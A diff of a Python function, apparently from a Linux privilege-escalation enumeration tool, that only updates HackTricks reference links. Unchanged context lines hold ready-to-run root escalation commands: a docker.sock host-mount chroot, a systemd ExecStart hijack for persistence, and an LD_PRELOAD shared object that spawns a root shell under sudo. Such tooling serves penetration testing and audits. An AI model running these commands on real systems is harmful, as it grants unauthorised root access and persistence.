@@ -637,7 +637,7 @@ def build_graph(f):
         elif nid == "docksock":
             n["desc"] = "/var/run/docker.sock is writable — you can talk to the Docker daemon (runs as root) directly."
             n["abuse"] = "docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh"
-            n["ref"] = "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/index.html"
+            n["ref"] = "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/"
         elif nid.startswith("wr:"):
             path = nid[3:]
             if path in SENSITIVE_WRITABLE:
@@ -664,7 +664,7 @@ def build_graph(f):
             n["abuse"] = (f"# point ExecStart at your payload, then:\n"
                           f"systemctl daemon-reload\nsystemctl start {base}\n"
                           f"# runs as root now (and on next boot)")
-            n["ref"] = "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-systemd-path"
+            n["ref"] = "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html"
         elif nid == "kernel":
             n["desc"] = f"Kernel {f.get('kernel','')} — potentially vulnerable to a public exploit."
             n["abuse"] = kernel_note(f.get("kernel", ""))
@@ -683,7 +683,7 @@ def build_graph(f):
                           "void _init(){unsetenv(\"LD_PRELOAD\");setgid(0);setuid(0);system(\"/bin/bash\");}\nEOF\n"
                           "gcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c\n"
                           "sudo LD_PRELOAD=/tmp/x.so <any-allowed-command>")
-            n["ref"] = "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ld_preload-and-ld_library_path"
+            n["ref"] = "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html"
         elif nid.startswith("nfs:"):
             share = nid[4:]
             n["desc"] = f"{share} is NFS-exported with no_root_squash — files you create as root on a box you control stay root here."
